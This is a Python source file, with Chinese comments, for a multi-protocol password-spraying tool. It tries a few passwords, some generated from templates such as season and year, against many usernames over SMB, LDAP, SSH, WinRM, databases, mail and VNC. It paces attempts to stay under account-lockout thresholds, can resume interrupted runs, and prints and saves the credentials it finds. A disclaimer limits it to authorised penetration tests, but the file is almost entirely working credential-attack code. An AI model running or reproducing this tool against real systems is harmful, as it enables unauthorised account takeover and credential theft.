#!/usr/bin/env python3
"""
Password Spray Tool — 仅限授权的渗透测试使用。

用小量密码对大量用户进行喷洒，避免触发账户锁定策略。

仅在获得授权的系统上使用。
"""

import argparse
import concurrent.futures
import csv
import json
import signal
import sys
import threading
import time
from datetime import datetime

from colorama import Fore, Style, init as colorama_init

from generator import generate_multi
from protocols.base import AuthResult, Result
from protocols.database import (
    MySQLProtocol,
    PostgreSQLProtocol,
    MSSQLProtocol,
    OracleProtocol,
    MongoDBProtocol,
    RedisProtocol,
)
from protocols.email import IMAPProtocol, POP3Protocol
from protocols.ftp import FTPProtocol
from protocols.http import HTTPProtocol
from protocols.ldap import LDAPProtocol
from protocols.smb import SMBProtocol
from protocols.ssh import SSHProtocol
from protocols.telnet import TelnetProtocol
from protocols.vnc import VNCProtocol
from protocols.winrm import WinRMProtocol

colorama_init(autoreset=True)

PROTOCOLS = {
    "smb":       SMBProtocol,
    "ldap":      LDAPProtocol,
    "http":      HTTPProtocol,
    "ssh":       SSHProtocol,
    "winrm":     WinRMProtocol,
    "telnet":    TelnetProtocol,
    "ftp":       FTPProtocol,
    "mysql":     MySQLProtocol,
    "postgresql": PostgreSQLProtocol,
    "mssql":     MSSQLProtocol,
    "oracle":    OracleProtocol,
    "mongodb":   MongoDBProtocol,
    "redis":     RedisProtocol,
    "imap":      IMAPProtocol,
    "pop3":      POP3Protocol,
    "vnc":       VNCProtocol,
}


class Sprayer:
    """密码喷洒编排器"""

    def __init__(
        self,
        protocol_name,
        target,
        users,
        passwords,
        threads=5,
        delay=1.0,
        round_delay=300,
        protocol_kwargs=None,
        state_file=None,
    ):
        self.protocol = PROTOCOLS[protocol_name]()
        self.target = target
        self.users = users
        self.passwords = passwords
        self.max_threads = threads
        self.delay = delay
        self.round_delay = round_delay
        self.protocol_kwargs = protocol_kwargs or {}
        self.state_file = state_file

        self.results = []
        self.successes = []
        self._stop = False
        self._lock = threading.Lock()

    def run(self, resume_from=0):
        total_users = len(self.users)
        total_passwords = len(self.passwords)
        remaining = total_passwords - resume_from

        self._print_banner(total_users, total_passwords, remaining)

        signal.signal(signal.SIGINT, self._signal_handler)
        started = time.time()

        try:
            for idx in range(resume_from, len(self.passwords)):
                if self._stop:
                    break

                password = self.passwords[idx]
                rnd = idx + 1

                print(
                    f"\n{Fore.YELLOW}{Style.BRIGHT}"
                    f"[第 {rnd}/{total_passwords} 轮] "
                    f"密码: '{password}'  ({total_users} 个用户)"
                )
                self._spray_round(password)
                self._save_state(rnd)

                if idx < len(self.passwords) - 1 and not self._stop:
                    self._countdown(self.round_delay)

            self._print_summary(time.time() - started)

        except Exception as exc:
            print(f"\n{Fore.RED}[!] 致命错误: {exc}")
        finally:
            self._save_state()

    def _spray_round(self, password):
        total = len(self.users)
        successes = 0
        lockouts = 0
        done = 0

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.max_threads
        ) as executor:
            futures = {}
            for user in self.users:
                if self._stop:
                    break
                futures[executor.submit(self._auth_one, user, password)] = user
                if len(futures) < total:
                    try:
                        time.sleep(self.delay)
                    except KeyboardInterrupt:
                        self._stop = True
                        break

            for future in concurrent.futures.as_completed(futures):
                if self._stop:
                    break

                try:
                    result = future.result()
                except Exception as exc:
                    result = AuthResult(
                        Result.ERROR, self.target, futures[future],
                        password, str(exc),
                    )

                done += 1

                with self._lock:
                    self.results.append(result)

                if result.result == Result.SUCCESS:
                    successes += 1
                    with self._lock:
                        self.successes.append(result)
                    print(
                        f"\n  {Fore.GREEN}{Style.BRIGHT}[+] "
                        f"{result.user} : {result.password}"
                    )

                elif result.result == Result.LOCKOUT:
                    lockouts += 1
                    print(
                        f"\n  {Fore.RED}{Style.BRIGHT}[!] "
                        f"账户已锁定: {result.user}"
                    )

                self._progress(done, total, successes, lockouts)

            print()

        print(
            f"  {Fore.CYAN}[*] 本轮完成: "
            f"{Fore.GREEN}{successes} 成功"
            f"{Fore.RESET}, "
            f"{Fore.RED}{lockouts} 锁定"
        )

    def _auth_one(self, user, password):
        try:
            return self.protocol.authenticate(
                target=self.target, user=user, password=password,
                **self.protocol_kwargs,
            )
        except Exception as exc:
            return AuthResult(
                Result.ERROR, self.target, user, password, str(exc),
            )

    def _signal_handler(self, _signum, _frame):
        print(
            f"\n\n{Fore.YELLOW}[!] 收到中断信号，等待进行中的尝试完成..."
        )
        self._stop = True

    def _save_state(self, next_round=None):
        if not self.state_file:
            return
        state = {
            "target": self.target,
            "protocol": self.protocol.name,
            "passwords_processed": next_round or 0,
            "total_passwords": len(self.passwords),
            "total_users": len(self.users),
            "success_count": len(self.successes),
            "results": [
                {
                    "user": r.user,
                    "password": r.password,
                    "result": r.result.value,
                    "message": r.message,
                    "timestamp": r.timestamp,
                }
                for r in self.results
            ],
            "last_updated": datetime.now().isoformat(),
        }
        try:
            with open(self.state_file, "w") as fh:
                json.dump(state, fh, indent=2)
            print(f"\n{Fore.CYAN}[*] 状态已保存到: {self.state_file}")
        except OSError as exc:
            print(f"\n{Fore.RED}[!] 保存状态失败: {exc}")

    def _print_banner(self, users, passwords, remaining):
        print(f"\n{Fore.CYAN}{'=' * 55}")
        print(f"{Fore.WHITE}{Style.BRIGHT}  密码喷洒 Password Spray")
        print(f"{Fore.CYAN}{'=' * 55}")
        print(f"  目标 Target:        {self.target}")
        print(f"  协议 Protocol:      {self.protocol.name}")
        print(f"  用户 Users:          {users}")
        print(f"  密码 Passwords:      {passwords} (剩余 {remaining})")
        print(f"  预计尝试次数:         {users * remaining}")
        print(f"  线程 Threads:        {self.max_threads}")
        print(f"  间隔 Delay/Round:    {self.delay}s / {self.round_delay}s")
        print(f"{Fore.CYAN}{'=' * 55}\n")

    @staticmethod
    def _progress(done, total, successes, lockouts):
        pct = done / total * 100
        sys.stdout.write(
            f"\r  {Fore.BLUE}[*] {done}/{total} ({pct:.0f}%)"
            f"  |  {Fore.GREEN}{successes} 成功"
            f"  |  {Fore.RED}{lockouts} 锁定"
            f"  {Fore.RESET}"
        )
        sys.stdout.flush()

    def _countdown(self, seconds):
        print(
            f"{Fore.CYAN}[*] 等待 {seconds:.0f}s 后开始下一轮..."
        )
        for remaining in range(int(seconds), 0, -1):
            if self._stop:
                break
            m, s = divmod(remaining, 60)
            sys.stdout.write(
                f"\r{Fore.CYAN}[*] 下一轮倒计时: {m:02d}:{s:02d}   "
            )
            sys.stdout.flush()
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                self._stop = True
                break
        print()

    def _print_summary(self, elapsed):
        if not self.results:
            print(f"\n{Fore.YELLOW}[!] 没有结果.")
            return

        total = len(self.results)
        counts = {
            "success": sum(1 for r in self.results
                           if r.result == Result.SUCCESS),
            "failure": sum(1 for r in self.results
                           if r.result == Result.FAILURE),
            "error": sum(1 for r in self.results
                         if r.result == Result.ERROR),
            "timeout": sum(1 for r in self.results
                           if r.result == Result.TIMEOUT),
            "lockout": sum(1 for r in self.results
                           if r.result == Result.LOCKOUT),
        }

        h, m = divmod(int(elapsed), 3600)
        m, s = divmod(m, 60)

        print(f"\n{Fore.CYAN}{'=' * 55}")
        print(f"{Fore.WHITE}{Style.BRIGHT}  喷洒完成 SPRAY COMPLETE")
        print(f"{Fore.CYAN}{'=' * 55}")
        print(f"  耗时 Duration:       {h:02d}:{m:02d}:{s:02d}")
        print(f"  总尝试 Total:        {total}")
        print(f"  {Fore.GREEN}成功 Successful:      {counts['success']}")
        print(f"  {Fore.YELLOW}失败 Failed:          {counts['failure']}")
        print(f"  {Fore.RED}错误 Error:           {counts['error']}")
        print(f"  {Fore.MAGENTA}超时 Timeout:        {counts['timeout']}")
        print(f"  {Fore.RED}锁定 Lockout:        {counts['lockout']}")

        if self.successes:
            print(f"\n  {Fore.GREEN}{Style.BRIGHT}发现的凭据 CREDENTIALS FOUND")
            print(f"  {Fore.CYAN}{'-' * 45}")
            for r in self.successes:
                print(f"  {Fore.GREEN}{r.user:40s} : {r.password}")
            print(f"  {Fore.CYAN}{'-' * 45}")

        print(f"{Fore.CYAN}{'=' * 55}\n")


# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------

def load_list(path):
    """从文件加载内容，跳过高亮行和注释行。"""
    items = []
    try:
        with open(path, encoding="utf-8") as fh:
            for line in fh:
                stripped = line.strip()
                if stripped and not stripped.startswith("#"):
                    items.append(stripped)
    except UnicodeDecodeError:
        with open(path, encoding="latin-1") as fh:
            for line in fh:
                stripped = line.strip()
                if stripped and not stripped.startswith("#"):
                    items.append(stripped)
    return items


def save_output(results, path):
    """保存结果为 CSV 或 JSON。"""
    if path.endswith(".json"):
        data = [
            {
                "timestamp": r.timestamp,
                "user": r.user,
                "password": r.password,
                "result": r.result.value,
                "message": r.message,
            }
            for r in results
        ]
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
    else:
        with open(path, "w", newline="", encoding="utf-8") as fh:
            writer = csv.writer(fh)
            writer.writerow(
                ["timestamp", "user", "password", "result", "message"]
            )
            for r in results:
                writer.writerow(
                    [r.timestamp, r.user, r.password,
                     r.result.value, r.message]
                )

    print(f"{Fore.GREEN}[+] 结果已保存到: {path}")


# ------------------------------------------------------------------
# CLI
# ------------------------------------------------------------------

def build_subparsers(subparsers):
    """Build all protocol subparsers and return them."""
    def add_common(p):
        p.add_argument("-t", "--target", required=True,
                       help="目标 IP 或主机名")
        p.add_argument("-U", "--users", required=True,
                       help="用户列表文件，每行一个用户名")
        p.add_argument("-p", "--password", action="append", required=True,
                       help="要喷洒的密码（可多次使用指定多个），如 -p 'Spring2026!'")
        p.add_argument("--generate", action="append", default=None,
                       help="密码生成模板（可多次使用），如 --generate '{Season}{Year}{Special}'")
        p.add_argument("--company", default="",
                       help="公司名，用于模板中的 {Company} 替换")
        p.add_argument("--year", type=int, default=None,
                       help="基准年份，用于模板中的 {Year}（默认当前年份）")
        p.add_argument("--max-combinations", type=int, default=50000,
                       help="模板生成密码数上限（默认 50000）")
        p.add_argument("-o", "--output", help="结果输出文件 (.csv 或 .json)")
        p.add_argument("--threads", type=int, default=5,
                       help="并发线程数（默认 5）")
        p.add_argument("--delay", type=float, default=1.0,
                       help="每轮内尝试间隔秒数（默认 1.0）")
        p.add_argument("--round-delay", type=float, default=300,
                       help="每轮之间间隔秒数（默认 300）")
        p.add_argument("--state-file", help="保存/恢复进度的 JSON 文件")
        p.add_argument("--resume", action="store_true",
                       help="从状态文件恢复进度")
        p.add_argument("--dry-run", action="store_true",
                       help="仅验证输入，不执行喷洒")

    # -- 网络协议 --
    p_smb = subparsers.add_parser("smb", help="SMB (port 445)")
    add_common(p_smb)
    p_smb.add_argument("-d", "--domain", default="", help="Windows 域名")

    p_ldap = subparsers.add_parser("ldap", help="LDAP/LDAPS (389/636)")
    add_common(p_ldap)
    p_ldap.add_argument("--ssl", action="store_true", help="使用 LDAPS (636)")
    p_ldap.add_argument("--port", type=int, help="自定义端口")

    p_http = subparsers.add_parser("http", help="HTTP/HTTPS (80/443)")
    add_common(p_http)
    p_http.add_argument("--http-method", default="basic",
                        choices=["basic", "ntlm", "digest", "form"],
                        help="认证方式（默认 basic）")
    p_http.add_argument("-d", "--domain", default="", help="NTLM 域名")
    p_http.add_argument("--form-url", help="表单登录 POST URL")
    p_http.add_argument("--form-user-field", default="username",
                        help="用户名字段名（默认 username）")
    p_http.add_argument("--form-pass-field", default="password",
                        help="密码字段名（默认 password）")
    p_http.add_argument("--form-success",
                        help="响应中表示登录成功的字符串")
    p_http.add_argument("--form-extra",
                        help="额外表单字段: key=val,key=val")
    p_http.add_argument("--no-ssl-verify", action="store_true",
                        help="禁用 TLS 证书验证")

    p_ssh = subparsers.add_parser("ssh", help="SSH (port 22)")
    add_common(p_ssh)
    p_ssh.add_argument("--port", type=int, default=22,
                       help="SSH 端口（默认 22）")

    p_winrm = subparsers.add_parser("winrm", help="WinRM (5985/5986)")
    add_common(p_winrm)
    p_winrm.add_argument("--ssl", action="store_true", default=True,
                         help="使用 HTTPS / 5986（默认）")
    p_winrm.add_argument("--no-ssl", action="store_false", dest="ssl",
                         help="使用 HTTP / 5985")
    p_winrm.add_argument("--port", type=int, help="自定义端口")

    p_telnet = subparsers.add_parser("telnet", help="Telnet (port 23)")
    add_common(p_telnet)
    p_telnet.add_argument("--port", type=int, default=23,
                          help="Telnet 端口（默认 23）")

    p_ftp = subparsers.add_parser("ftp", help="FTP (port 21)")
    add_common(p_ftp)
    p_ftp.add_argument("--port", type=int, default=21,
                       help="FTP 端口（默认 21）")

    # -- 数据库 --
    p_mysql = subparsers.add_parser("mysql", help="MySQL (port 3306)")
    add_common(p_mysql)
    p_mysql.add_argument("--port", type=int, default=3306,
                         help="MySQL 端口（默认 3306）")

    p_pg = subparsers.add_parser("postgresql", help="PostgreSQL (port 5432)")
    add_common(p_pg)
    p_pg.add_argument("--port", type=int, default=5432,
                      help="PostgreSQL 端口（默认 5432）")

    p_mssql = subparsers.add_parser("mssql", help="MSSQL (port 1433)")
    add_common(p_mssql)
    p_mssql.add_argument("--port", type=int, default=1433,
                         help="MSSQL 端口（默认 1433）")

    p_oracle = subparsers.add_parser("oracle", help="Oracle (port 1521)")
    add_common(p_oracle)
    p_oracle.add_argument("--port", type=int, default=1521,
                          help="Oracle 端口（默认 1521）")
    p_oracle.add_argument("--sid", default="XE",
                          help="Oracle SID（默认 XE）")

    p_mongo = subparsers.add_parser("mongodb", help="MongoDB (port 27017)")
    add_common(p_mongo)
    p_mongo.add_argument("--port", type=int, default=27017,
                         help="MongoDB 端口（默认 27017）")
    p_mongo.add_argument("--auth-db", default="admin",
                         help="认证数据库（默认 admin）")

    p_redis = subparsers.add_parser("redis", help="Redis (port 6379)")
    add_common(p_redis)
    p_redis.add_argument("--port", type=int, default=6379,
                         help="Redis 端口（默认 6379）")

    # -- 邮件 --
    p_imap = subparsers.add_parser("imap", help="IMAP/IMAPS (143/993)")
    add_common(p_imap)
    p_imap.add_argument("--ssl", action="store_true",
                        help="使用 IMAPS (993)")
    p_imap.add_argument("--port", type=int, help="自定义端口")

    p_pop3 = subparsers.add_parser("pop3", help="POP3/POP3S (110/995)")
    add_common(p_pop3)
    p_pop3.add_argument("--ssl", action="store_true",
                        help="使用 POP3S (995)")
    p_pop3.add_argument("--port", type=int, help="自定义端口")

    # -- 远程桌面 --
    p_vnc = subparsers.add_parser("vnc", help="VNC (port 5900)")
    add_common(p_vnc)
    p_vnc.add_argument("--port", type=int, default=5900,
                       help="VNC 端口（默认 5900）")


def build_protocol_kwargs(args):
    """Build protocol keyword arguments from parsed CLI args."""
    pkwargs = {}

    if args.cmd == "smb":
        pkwargs["domain"] = args.domain

    elif args.cmd == "ldap":
        pkwargs["use_ssl"] = args.ssl
        if args.port:
            pkwargs["port"] = args.port

    elif args.cmd == "http":
        pkwargs["method"] = args.http_method
        pkwargs["verify_ssl"] = not args.no_ssl_verify
        if args.http_method == "ntlm" and args.domain:
            pkwargs["domain"] = args.domain
        if args.http_method == "form":
            pkwargs.update({
                "form_url": args.form_url,
                "form_user_field": args.form_user_field,
                "form_pass_field": args.form_pass_field,
                "form_success": args.form_success,
                "form_extra": args.form_extra,
            })

    elif args.cmd == "ssh":
        pkwargs["port"] = args.port

    elif args.cmd == "winrm":
        pkwargs["use_ssl"] = args.ssl
        if args.port:
            pkwargs["port"] = args.port

    elif args.cmd == "telnet":
        pkwargs["port"] = args.port

    elif args.cmd == "ftp":
        pkwargs["port"] = args.port

    elif args.cmd == "mysql":
        pkwargs["port"] = args.port

    elif args.cmd == "postgresql":
        pkwargs["port"] = args.port

    elif args.cmd == "mssql":
        pkwargs["port"] = args.port

    elif args.cmd == "oracle":
        pkwargs["port"] = args.port
        pkwargs["sid"] = args.sid

    elif args.cmd == "mongodb":
        pkwargs["port"] = args.port
        pkwargs["auth_db"] = args.auth_db

    elif args.cmd == "redis":
        pkwargs["port"] = args.port

    elif args.cmd == "imap":
        pkwargs["use_ssl"] = args.ssl
        if args.port:
            pkwargs["port"] = args.port

    elif args.cmd == "pop3":
        pkwargs["use_ssl"] = args.ssl
        if args.port:
            pkwargs["port"] = args.port

    elif args.cmd == "vnc":
        pkwargs["port"] = args.port

    return pkwargs


def main():
    parser = argparse.ArgumentParser(
        description="密码喷洒工具 — 仅限授权的渗透测试使用。",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例 Examples:
  spray.py smb   -t 192.168.1.10 -U users.txt -p 'Spring2026!'
  spray.py ldap  -t dc.corp.local -U users.txt -p 'P@ssw0rd' --ssl
  spray.py ssh   -t 192.168.1.10 -U users.txt -p 'Welcome1' -p 'Company1'
  spray.py mysql -t 192.168.1.10 -U users.txt -p 'root' --generate '{Season}{Year}{Special}'
  spray.py redis -t 192.168.1.10 -U users.txt -p ''

恢复中断的喷洒:
  spray.py smb -t 192.168.1.10 -U users.txt -p 'Spring2026!' --state-file state.json --resume
        """,
    )

    subparsers = parser.add_subparsers(dest="cmd", help="目标协议")
    build_subparsers(subparsers)

    args = parser.parse_args()

    if not args.cmd:
        parser.print_help()
        sys.exit(1)

    # -- 加载用户 --------------------------------------------------------------
    try:
        users = load_list(args.users)
    except FileNotFoundError:
        print(f"{Fore.RED}[!] 用户文件未找到: {args.users}")
        sys.exit(1)

    if not users:
        print(f"{Fore.RED}[!] 用户文件为空.")
        sys.exit(1)

    users = list(dict.fromkeys(users))

    # -- 收集密码（喷洒模式：少量密码，大量用户）-------------------------------
    passwords = []
    passwords.extend(args.password)

    if args.generate:
        try:
            generated = generate_multi(
                args.generate, company=args.company, year=args.year,
            )
            if len(generated) > args.max_combinations:
                print(
                    f"{Fore.RED}[!] 模板生成 {len(generated)} 个密码，"
                    f"超过上限 {args.max_combinations}."
                )
                print(
                    f"{Fore.YELLOW}[!] 请精简模板或调高 --max-combinations.")
                sys.exit(1)
            passwords.extend(generated)
            print(
                f"{Fore.CYAN}[*] 从模板生成了 {len(generated)} 个密码")
        except ValueError as exc:
            print(f"{Fore.RED}[!] 模板错误: {exc}")
            sys.exit(1)

    if not passwords:
        print(
            f"{Fore.RED}[!] 未指定密码。"
            f"请使用 -P、-p 或 --generate 指定密码来源."
        )
        sys.exit(1)

    passwords = list(dict.fromkeys(passwords))

    # -- 协议参数 --------------------------------------------------------------
    pkwargs = build_protocol_kwargs(args)

    # -- 试运行 ----------------------------------------------------------------
    if args.dry_run:
        print(f"\n{Fore.CYAN}[*] 试运行 DRY RUN — 仅验证输入\n")
        print(f"  目标 Target:      {args.target}")
        print(f"  协议 Protocol:    {args.cmd}")
        print(f"  用户 Users:       {len(users)}")
        print(f"  密码 Passwords:   {len(passwords)}")
        if args.generate:
            print(f"  (含模板生成密码)")
        print(f"  总尝试次数:        {len(users) * len(passwords)}")
        print(f"  线程 Threads:     {args.threads}")
        print(f"  间隔 Delay:       {args.delay}s")
        print(f"  轮间隔 Round:     {args.round_delay}s")
        print(f"  协议选项:          {pkwargs}")
        print(f"  输出 Output:      {args.output or '(无)'}")
        print(f"  状态文件:          {args.state_file or '(无)'}")
        print(f"\n{Fore.GREEN}[+] 输入验证通过.")
        print(f"{Fore.YELLOW}[!] 去掉 --dry-run 即可执行.\n")
        return

    # -- 恢复进度 --------------------------------------------------------------
    resume_from = 0
    if args.resume and args.state_file:
        try:
            with open(args.state_file) as fh:
                state = json.load(fh)
        except FileNotFoundError:
            print(f"{Fore.RED}[!] 状态文件未找到: {args.state_file}")
            sys.exit(1)
        except json.JSONDecodeError as exc:
            print(f"{Fore.RED}[!] 无效的状态文件: {exc}")
            sys.exit(1)

        if state.get("target") != args.target:
            print(
                f"{Fore.RED}[!] 状态文件目标 ({state.get('target')}) "
                f"与 --target ({args.target}) 不匹配"
            )
            sys.exit(1)

        resume_from = state.get("passwords_processed", 0)
        print(
            f"{Fore.CYAN}[*] 从第 {resume_from} 轮恢复 "
            f"({resume_from}/{state.get('total_passwords', '?')} 已完成)"
        )

    # -- 执行喷洒 --------------------------------------------------------------
    sprayer = Sprayer(
        protocol_name=args.cmd,
        target=args.target,
        users=users,
        passwords=passwords,
        threads=args.threads,
        delay=args.delay,
        round_delay=args.round_delay,
        protocol_kwargs=pkwargs,
        state_file=args.state_file,
    )

    sprayer.run(resume_from=resume_from)

    if args.output and sprayer.results:
        save_output(sprayer.results, args.output)


if __name__ == "__main__":
    main()
